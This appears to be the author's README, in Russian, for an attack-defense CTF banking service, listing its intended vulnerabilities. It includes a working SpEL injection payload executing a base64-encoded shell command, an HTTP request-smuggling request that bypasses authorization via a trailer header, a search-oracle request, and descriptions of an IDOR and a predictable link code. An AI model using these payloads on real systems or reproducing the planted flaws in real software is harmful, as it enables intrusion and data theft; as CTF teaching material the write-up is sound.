# Z-Bank

Предположительно, самый дырявый ад-сервис - интендед (а может и не только) уязвимостей в нём вагон и маленькая тележка. Почему бы и нет?

Флагов кладётся больше, чем получится украсть интендед уязвимостями.
В сервисе много "лишнего" функционала, чтобы его было не так тривиально переписать иишкой.

Вот что в нём по крайней мере закладывалось:

1. Очевиднейшая SpEL Injection в chart service

```bash
''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec(''.class.getConstructor('a'.getBytes().getClass()).newInstance(''.class.forName('java.util.Base64').getMethod('getDecoder').invoke(null).decode('dG91Y2ggL3RtcC9wd25lZA==')))
```

Получаем RCE и можем смотреть чужие чарты. Если кто-то не менял креды от БД -- ещё и сходить в чужую БД напрямую... ^^

2. PreAuthorize не проверяется для внутренних вызовов методов в классе в депозитах -> можем мержить чужие депозиты в свои и получать флаг на выходе.

Простой IDOR, через который можно вмержить чужой счет в свой и получить его имя. Очевидно ищется ручками, но плохо ищется по коду (и не ищется иишкой? по крайней мере у меня не нашлось) -> хороший кандидат на уязу. Плюс айди инкрементальные, а значит -- можно не давать аттак дату.

3. http requests smuggling через lighttpd (CVE-2025-12642).

Можем просмагглить заголовок `X-Local-Job` и тем самым обойти авторизацию и потыкаться во внутреннюю апишку по выпискам. Там, зная ID выписок, можно получить их s3-key и обратиться к выпискам.

ID выписок инкрементальные.

```http
POST /api/internal/statements/2/process HTTP/1.1
Host: localhost:8080
Cookie: JSESSIONID=2CDC7CF377C126BAB078DCF2D8BA4FCC
Connection: close
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Trailer: X-Local-Job

a
0123456789
0
X-Local-Job: true

```

4. Бинарный оракул при поиске постов.

Можем искать по любому полю -> можем искать по id + ключу для доступа к приватному посту...

```
POST /api/rhythm/posts/search HTTP/1.1
Host: localhost:8080
Content-Length: 75
content-type: application/json
Cookie: JSESSIONID=FC3364EE42DF67FA0A1AE722085BF139

{"accessKey":"e06946ea","postUuidd":"c4a4d15c-6f8c-417d-a11a-6b0c8d5dc1d9"}
```

Если такой объект есть, то он отфильтруется и мы получим 200, иначе -- получим сразу 404.

5. Миша Соловьёв подсветил забавную строчку в нейрослопе:
   .linkCode(UUID.randomUUID().toString().substring(0, 8)) в services/zbank/zbank-api/src/main/java/com/zbank/service/FundraisingService.java

Я решил оставить этот как интендед и заменить на uuid v1: теперь linkCode предсказуемый -> можем смотреть чужие fundraising...
